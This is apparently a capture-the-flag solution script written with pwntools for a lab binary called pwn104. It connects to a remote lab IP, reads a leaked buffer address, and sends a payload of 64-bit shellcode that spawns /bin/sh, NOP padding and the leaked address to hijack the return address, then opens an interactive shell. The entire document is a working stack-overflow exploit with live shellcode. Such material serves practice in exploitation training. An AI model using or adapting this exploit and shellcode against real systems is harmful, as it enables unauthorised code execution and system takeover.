# an aslr binary that leaks the location of a buffer we overflow. the buffer location is executable
# by putting shellcode in that buffer, then redirecting back to it (as we have its address) we gain execution

from pwn import *

current_thmip = '10.10.134.184'

p = remote(current_thmip,9004)
# p = process("./pwn104.pwn104")

p.recvuntil(b'at ')
address = p.recvline()
bufferLocation = p64(int(address, 16))

# https://www.exploit-db.com/shellcodes/46907, 64bit linux shellcode
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'

payload = shellcode
payload += b'\x90' * (88 - len(shellcode))
payload += bufferLocation # this will be the location of the payload itself in the local variable

p.sendline(payload)
p.interactive()

